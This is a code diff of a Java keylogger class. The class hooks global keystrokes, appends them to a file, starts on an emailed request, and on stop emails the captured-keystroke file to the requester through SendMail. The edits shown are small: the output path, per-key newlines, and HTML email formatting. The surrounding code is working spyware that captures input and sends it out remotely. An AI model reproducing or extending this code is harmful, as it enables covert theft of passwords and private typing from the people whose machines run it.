@@ -18,7 +18,7 @@ import java.util.Properties;
 import java.util.Scanner;
 
 public class KeyLogger implements NativeKeyListener {
-    private static final Path file = Paths.get("./src/test/java/output/keys.txt");
+    private static final Path file = Paths.get("./src/test/output/keys.txt");
     private static boolean running = false;
 
     static {
@@ -45,9 +45,9 @@ public class KeyLogger implements NativeKeyListener {
         try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.APPEND);
              PrintWriter writer = new PrintWriter(os)) {
             if (keyText.length() > 1) {
-                writer.print("[" + keyText + "]");
+                writer.println("[" + keyText + "]");
             } else {
-                writer.print(keyText);
+                writer.println(keyText);
             }
         } catch (IOException ex) {
             System.out.println("sai o duoi");
@@ -76,7 +76,8 @@ public class KeyLogger implements NativeKeyListener {
             System.out.println("Keylogger is running...");
         }
         SendMail.serversendEmail(from, "Reply for request: Start keylogger", "",
-                HTMLGenerator.generateHTML("Your request has been completed successfully!", "Key logger has started"));
+                HTMLGenerator.generateHTML("Your request has been completed successfully!", "",
+                        "Key logger has started"));
     }
 
     public static void stopKeylogger(String from) {
@@ -93,7 +94,7 @@ public class KeyLogger implements NativeKeyListener {
         }
 
         SendMail.serversendEmail(from, "Reply for request: Stop keylogger", file.toString(),
-                HTMLGenerator.generateHTML("Your request has been completed successfully",
+                HTMLGenerator.generateHTML("Your request has been completed successfully", "",
                         """
                                  The keylogger has stopped. 
                                  The file below contains the captured keystrokes.
